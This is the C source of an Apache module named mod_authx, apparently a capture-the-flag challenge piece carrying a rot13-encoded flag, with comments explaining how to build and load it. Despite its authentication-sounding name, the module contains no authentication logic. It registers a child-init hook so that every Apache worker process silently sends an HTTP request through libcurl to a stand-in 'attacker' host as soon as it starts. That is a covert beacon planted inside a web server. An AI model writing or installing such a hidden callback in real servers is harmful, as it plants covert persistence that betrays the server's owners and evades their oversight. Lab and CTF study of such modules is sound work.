// mod_authx.c
// HOW TO ENABLE:
// apxs2 -c -i mod_authx.c -lcurl
// echo 'LoadModule authx_module /usr/lib/apache2/modules/mod_authx.so' > /etc/apache2/mods-available/authx.load
// a2enmod authx
// restart/start apache2
#include "httpd.h"
#include "http_config.h"
#include "http_log.h"

#include <curl/curl.h>

/* -----------------------------
   Hook 1: Run in Apache parent
   Initialize libcurl ONCE
-------------------------------- */
static int authx_core_pre_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp)
{
    CURLcode res = curl_global_init(CURL_GLOBAL_ALL);
    return OK;
}


/* -----------------------------
    ping function
-------------------------------- */
static void do_ping(server_rec *s)
{
    CURL *curl = curl_easy_init();
    if (!curl) {
        return;
    }

    //curl_easy_setopt(curl, CURLOPT_URL, "http://attacker/CPPP{gbxra_2_ncnpur_zbq}"); //PCCC{token_2_apache_mod} rot 13
    curl_easy_setopt(curl, CURLOPT_URL, "http://attacker/PLACEHOLDER"); //PCCC{token_2_apache_mod} rot 13
    curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);  // optional

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);   // cleans handle, closes connections
}


/* -----------------------------
   Hook 2: Run in each Apache child
-------------------------------- */
static void authx_core_child_init(apr_pool_t *p, server_rec *s)
{
    do_ping(s);
}


/* -----------------------------
   Register module hooks
-------------------------------- */
static void authx_core_register_hooks(apr_pool_t *p)
{
    ap_hook_pre_config(authx_core_pre_config, NULL, NULL, APR_HOOK_MIDDLE);
    ap_hook_child_init(authx_core_child_init, NULL, NULL, APR_HOOK_MIDDLE);
}


module AP_MODULE_DECLARE_DATA authx_core_module =
{
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    authx_core_register_hooks
};
